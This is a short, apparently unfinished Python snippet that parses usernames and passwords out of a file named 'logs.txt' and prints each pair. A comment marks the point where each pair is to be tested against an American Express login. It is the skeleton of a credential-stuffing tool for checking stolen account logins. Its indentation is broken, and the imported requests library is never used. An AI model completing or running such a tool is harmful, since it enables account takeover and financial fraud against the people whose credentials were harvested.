import requests

creds = open('logs.txt').read()
for line in creds.split('===')[1:]:
    if 'username' in line:
 user = line.split('"username":"')[1].split('"')[0]
 passw = line.split('"password":"')[1].split('"')[0]
 # Test Amex login (customize)
 print(f"Testing {user}:{passw}")
